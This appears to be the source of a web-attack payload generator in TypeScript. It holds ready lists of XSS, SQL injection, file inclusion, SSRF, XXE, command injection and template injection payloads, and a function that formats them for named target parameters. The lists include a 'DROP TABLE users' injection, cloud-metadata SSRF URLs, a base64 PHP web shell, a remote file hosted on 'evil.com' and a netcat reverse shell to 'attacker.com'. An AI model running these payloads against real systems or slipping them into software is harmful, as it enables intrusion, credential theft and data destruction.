export interface PayloadConfig {
  type: string;
  target: string;
  parameters: string[];
}

export interface VulnerabilityType {
  id: string;
  name: string;
  icon: string;
  description: string;
}

export const vulnerabilityTypes: VulnerabilityType[] = [
  { id: "xss", name: "XSS", icon: "🔥", description: "Cross-Site Scripting - Inject malicious scripts into web pages" },
  { id: "sqli", name: "SQLi", icon: "💉", description: "SQL Injection - Manipulate database queries" },
  { id: "lfi", name: "LFI", icon: "📁", description: "Local File Inclusion - Access server files" },
  { id: "rfi", name: "RFI", icon: "🌐", description: "Remote File Inclusion - Include remote files" },
  { id: "ssrf", name: "SSRF", icon: "🔄", description: "Server-Side Request Forgery - Make requests from server" },
  { id: "xxe", name: "XXE", icon: "📄", description: "XML External Entity - Exploit XML parsers" },
  { id: "rce", name: "RCE", icon: "⚡", description: "Remote Code Execution - Execute arbitrary code" },
  { id: "ssti", name: "SSTI", icon: "📝", description: "Server-Side Template Injection - Inject templates" },
];

const xssPayloads = [
  `<script>alert('XSS')</script>`,
  `<img src=x onerror=alert('XSS')>`,
  `"><script>alert(String.fromCharCode(88,83,83))</script>`,
  `<svg/onload=alert('XSS')>`,
  `javascript:alert('XSS')`,
];

const sqliPayloads = [
  `' OR '1'='1`,
  `' UNION SELECT NULL,NULL,NULL--`,
  `1; DROP TABLE users--`,
  `' OR 1=1--`,
  `admin'--`,
];

const lfiPayloads = [
  `../../../etc/passwd`,
  `....//....//....//etc/passwd`,
  `/etc/passwd%00`,
  `php://filter/convert.base64-encode/resource=index.php`,
  `expect://id`,
];

const rfiPayloads = [
  `http://evil.com/shell.txt`,
  `php://input`,
  `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`,
];

const ssrfPayloads = [
  `http://169.254.169.254/latest/meta-data/`,
  `http://metadata.google.internal/computeMetadata/v1/`,
  `file:///etc/passwd`,
  `gopher://internal-host:70/`,
];

const xxePayloads = [
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>`,
];

const rcePayloads = [
  `; ls -la`,
  `| cat /etc/passwd`,
  `$(whoami)`,
  "`id`",
  `; nc -e /bin/sh attacker.com 4444`,
];

const sstiPayloads = [
  `{{7*7}}`,
  `${7*7}`,
  `{{config.items()}}`,
  `#{7*7}`,
  `<%= 7*7 %>`,
];

const payloadMap: Record<string, string[]> = {
  xss: xssPayloads,
  sqli: sqliPayloads,
  lfi: lfiPayloads,
  rfi: rfiPayloads,
  ssrf: ssrfPayloads,
  xxe: xxePayloads,
  rce: rcePayloads,
  ssti: sstiPayloads,
};

export function generatePayload(config: PayloadConfig): string {
  const payloads = payloadMap[config.type] || xssPayloads;
  const selectedPayloads = payloads.slice(0, 3);
  
  let output = `# Generated Payloads for ${config.type.toUpperCase()}\n`;
  output += `# Target: ${config.target}\n`;
  output += `# Parameters: ${config.parameters.join(", ")}\n\n`;
  
  config.parameters.forEach(param => {
    output += `# Testing parameter: ${param}\n`;
    selectedPayloads.forEach((payload, index) => {
      output += `${param}=${encodeURIComponent(payload)}\n`;
    });
    output += `\n`;
  });
  
  output += `\n# Raw Payloads:\n`;
  selectedPayloads.forEach(payload => {
    output += `${payload}\n`;
  });
  
  return output;
}